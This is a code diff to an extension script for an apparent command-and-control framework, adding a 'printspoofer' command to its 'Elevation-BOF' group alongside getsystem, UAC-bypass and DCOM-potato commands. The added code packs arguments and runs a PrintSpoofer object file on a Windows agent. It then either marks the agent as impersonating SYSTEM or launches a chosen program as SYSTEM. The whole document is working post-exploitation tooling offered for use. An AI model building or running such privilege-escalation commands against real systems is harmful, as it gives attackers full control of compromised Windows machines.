@@ -78,7 +78,39 @@ cmd_dcom_potato.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 });
 
 
-var group_test = ax.create_commands_group("Elevation-BOF", [cmd_getsystem, cmd_uacbybass, cmd_dcom_potato]);
+var cmd_printspoofer = ax.create_command("printspoofer", "PrintSpoofer - Local Privilege Escalation via Print Spooler (Named Pipe Impersonation)", "printspoofer --token");
+cmd_printspoofer.addArgBool( "--token", "Elevate the current agent to SYSTEM context");
+cmd_printspoofer.addArgFlagString( "--run", "program", false, "Run new process in SYSTEM context (Program with arguments)");
+cmd_printspoofer.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+
+    let use_token = 0;
+    let run_program = "";
+
+    if(parsed_json["--token"]) { use_token = 1; }
+    if(parsed_json.hasOwnProperty("program")) { run_program = parsed_json["program"]; }
+
+    if( (use_token && run_program.length) || (!use_token && run_program.length == 0) ) { throw new Error("Use only --token or --run"); }
+
+    let bof_path = ax.script_dir() + "_bin/printspoofer." + ax.arch(id) + ".o";
+    let bof_params = ax.bof_pack("int,wstr", [use_token, run_program]);
+
+    if (use_token) {
+        let hook = function (task)
+        {
+            if(/Impersonate to SYSTEM succeeded/.test(task.text)) {
+                ax.agent_set_impersonate(task.agent, "SYSTEM", true);
+            }
+            return task;
+        }
+        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF PrintSpoofer: elevate to SYSTEM", hook);
+    }
+    else {
+        ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `BOF PrintSpoofer: run ${run_program}`);
+    }
+});
+
+
+var group_test = ax.create_commands_group("Elevation-BOF", [cmd_getsystem, cmd_uacbybass, cmd_dcom_potato, cmd_printspoofer]);
 ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);
 
 
